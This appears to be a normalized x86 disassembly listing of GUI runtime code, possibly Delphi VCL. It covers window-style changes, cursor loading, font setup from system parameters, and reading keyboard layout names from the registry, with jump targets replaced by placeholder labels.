test al al
je r-xdata
sub_472aac
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_418dc4
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_461e00
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_472b00
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_472aac
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_4033e8
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_472b7c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_421a7c
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_472bb8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_455f30
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_456c00
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_472c00
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_45c684
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_45c380
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_45c380
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_45c380
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_45c380
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_45c380
push eax
call RedrawWindow
sub_472d54
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_46db04
mov dl 0x5
mov eax ebx
call sub_46f878
mov dl 0x1
mov eax ebx
call sub_45af24
mov dl 0x3
mov eax ebx
call sub_46fb74
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_472dbc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_472e93
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_45ade4
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_45ac50
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_454f60
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4559c0
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_40406c
mov eax [ ebp - 0xc ]
call sub_40423c
push eax
mov eax [ ebp - 0xc ]
call sub_40443c
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_4559d0
mov eax [ ebp - 0xc ]
call sub_40423c
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472e9a
lea eax [ ebp - 0xc ]
call sub_403f7c
retn
mov dl 0x1
mov eax esi
call sub_46eef8
mov edx [ ebp - 0xc ]
mov eax esi
call sub_455a7c
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_4045c8
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_472ec0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_459078
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_46e61c
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_45903c
mov edx ebx
pop ecx
mov si 0xffcc
call sub_4033e8
inc ebp
dec edi
jne r-xdata
sub_472f0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_45ade4
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_472f38
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45b5ec
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_472f60
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_4712c8
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_45c380
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_45ade4
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_45c380
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_45c380
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_45adf8
or ecx 0xffffffff
mov dl 0x1
call sub_4560f4
pop esi
pop ebx
retn
sub_472ff8
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_45ba5c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_456c00
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_4553ec
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_4033e8
sub_473050
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_473116
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_4559c0
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_40406c
mov eax [ ebp - 0x4 ]
call sub_40423c
push eax
mov eax [ ebp - 0x4 ]
call sub_40443c
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_4559d0
mov eax [ ebp - 0x4 ]
call sub_40423c
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_455a7c
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47311d
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_46eef8
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_4045c8
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_47313c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_45b7dc
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45ade4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_45adf8
mov dl [ ebx + 0x57 ]
call sub_45596c
inc edi
dec esi
jne r-xdata
sub_4731e0
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_473210
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_473240
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4212ec
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_4735e4
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_4735f0
mov eax ebx
call sub_4735fc
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_46fa18
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4245d4
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4245d4
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4245d4
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_473a1c
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4738f8
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4738f8
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4738f8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_473398
push ebx
push esi
push edi
push ebp
call sub_4035b8
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_4031ec
mov eax [ ebp + 0x88 ]
call sub_4031ec
mov eax [ ebp + 0x84 ]
call sub_4031ec
mov eax [ ebp + 0x54 ]
call sub_4031ec
mov eax [ ebp + 0x50 ]
call sub_4031ec
mov eax [ ebp + 0x4c ]
call sub_4031ec
mov eax [ ebp + 0x30 ]
call sub_4031ec
mov eax [ ebp + 0x34 ]
call sub_4031ec
mov eax [ ebp + 0x7c ]
call sub_4031ec
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_4031ec
mov eax ebp
call sub_473658
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_421338
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4035a0
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_418dc4
call sub_4031ec
inc edi
dec esi
jne r-xdata
sub_473510
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_47355c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418c68
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418c68
mov eax [ rw-data ]
call sub_4762e8
sub_473594
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418f60
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418f60
mov eax [ rw-data ]
call sub_4762e8
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_45d914
sub_4735fc
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_4736b4
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_473658
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_40278c
mov ebx esi
test ebx ebx
jne r-xdata
sub_4736b4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_40276c
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_4736dc
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_473887
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47388e
lea eax [ ebp - 0x260 ]
call sub_403f7c
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_403f7c
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_41b2ec
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408ff0
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_4610bc
test al al
je r-xdata
xor eax eax
push ebp
push sub_473843
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4041ec
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4041ec
sub_4738f8
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_476158
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_475f0c
mov dl 0x1
mov eax [ rw-data ]
call sub_475f0c
sub_473964
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_47398c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_473964
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406cb0
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406c2c
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_473a1c
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_473b61
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_475f0c
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_424964
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_424964
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_424a48
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_424964
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_424964
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_424964
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_475f0c
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_4247a8
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_4247a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473b68
cmp [ rw-data ] 0x0
je r-xdata
sub_473ba0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_473c00
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_473d3c ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_473db0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
